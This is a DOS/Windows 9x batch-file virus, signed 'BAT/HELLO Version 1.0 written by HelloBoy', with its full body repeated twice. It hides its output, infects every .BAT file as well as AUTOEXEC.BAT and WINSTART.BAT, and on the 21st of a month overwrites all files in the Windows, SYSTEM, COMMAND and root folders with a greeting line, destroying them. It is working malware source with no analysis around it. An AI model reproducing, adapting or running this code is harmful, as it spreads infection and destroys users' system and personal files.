@ECHO OFF
CTTY NUL
ATTRIB -H -S +R %0.BAT
ATTRIB -H -R -S HELLOTMP.BAT
DEL HELLOTMP.BAT
ATTRIB -H -R -S HELLOTEM.BAT
ATTRIB -H -S C:\AUTOEXEC.BAT
ATTRIB -H -S %WINDIR%\WINSTART.BAT
ATTRIB -H -S %WINBOOTDIR%\WINSTART.BAT
DEL KK.BAT
ECHO IF %%1==HELLOTMP.BAT GOTO NO >>HELLOTMP.BAT
ECHO IF %%1==%%2 GOTO NO >>HELLOTMP.BAT
ECHO IF %%1==%0.BAT GOTO NO >>HELLOTMP.BAT
ECHO COPY %%2 KK.BAT >>HELLOTMP.BAT
ECHO COPY /A KK.BAT + %%1 KK.BAT >>HELLOTMP.BAT
ECHO DEL %%1 >>HELLOTMP.BAT
ECHO COPY KK.BAT %%1 >>HELLOTMP.BAT
ECHO ATTRIB +R %%1 >>HELLOTMP.BAT
ECHO DEL KK.BAT >>HELLOTMP.BAT
ECHO :NO >>HELLOTMP.BAT
FOR %%F IN (*.BAT C:\AUTOEXEC.BAT %WINBOOTDIR%\WINSTART.BAT
%WINDIR%\WINSTART.BAT ) DO CALL HELLOTMP.BAT %%F %0.BAT
ATTRIB -R \WINSTART.BAT
DEL \WINSTART.BAT
ATTRIB -H -R -S HELLOTEM.BAT
ECHO.|DATE|FIND "-21-"
IF ERRORLEVEL=1 GOTO END
DEL HELLOTEM.BAT
ECHO HELLO!!!Good Morning.  >>HELLOTEM.BAT
FOR %%f in (*.* %WINBOOTDIR%\*.* %WINDIR%\*.* %WINDIR%\SYSTEM\*.*
%WINBOOTDIR%\SYSTEM\*.* %WINBOOTDIR%\COMMAND\*.* C:\*.* \*.*) DO Call
HELLOTMP.BAT %%f HELLOTEM.BAT
:END
DEL HELLOTEM.BAT
DEL HELLOTMP.BAT
@ECHO OFF
CTTY NUL
ATTRIB -H -S +R %0.BAT
ATTRIB -H -R -S HELLOTMP.BAT
DEL HELLOTMP.BAT
ATTRIB -H -R -S HELLOTEM.BAT
ATTRIB -H -S C:\AUTOEXEC.BAT
ATTRIB -H -S %WINDIR%\WINSTART.BAT
ATTRIB -H -S %WINBOOTDIR%\WINSTART.BAT
DEL KK.BAT
ECHO IF %%1==HELLOTMP.BAT GOTO NO >>HELLOTMP.BAT
ECHO IF %%1==%%2 GOTO NO >>HELLOTMP.BAT
ECHO IF %%1==%0.BAT GOTO NO >>HELLOTMP.BAT
ECHO COPY %%2 KK.BAT >>HELLOTMP.BAT
ECHO COPY /A KK.BAT + %%1 KK.BAT >>HELLOTMP.BAT
ECHO DEL %%1 >>HELLOTMP.BAT
ECHO COPY KK.BAT %%1 >>HELLOTMP.BAT
ECHO ATTRIB +R %%1 >>HELLOTMP.BAT
ECHO DEL KK.BAT >>HELLOTMP.BAT
ECHO :NO >>HELLOTMP.BAT
FOR %%F IN (*.BAT C:\AUTOEXEC.BAT %WINBOOTDIR%\WINSTART.BAT
%WINDIR%\WINSTART.BAT ) DO CALL HELLOTMP.BAT %%F %0.BAT
ATTRIB -R \WINSTART.BAT
DEL \WINSTART.BAT
ATTRIB -H -R -S HELLOTEM.BAT
ECHO.|DATE|FIND "-21-"
IF ERRORLEVEL=1 GOTO END
DEL HELLOTEM.BAT
ECHO HELLO!!!Good Morning.  >>HELLOTEM.BAT
FOR %%f in (*.* %WINBOOTDIR%\*.* %WINDIR%\*.* %WINDIR%\SYSTEM\*.*
%WINBOOTDIR%\SYSTEM\*.* %WINBOOTDIR%\COMMAND\*.* C:\*.* \*.*) DO Call
HELLOTMP.BAT %%f HELLOTEM.BAT
:END
DEL HELLOTEM.BAT
DEL HELLOTMP.BAT
REM BAT/HELLO Version 1.0 written by HelloBoy
CTTY CON
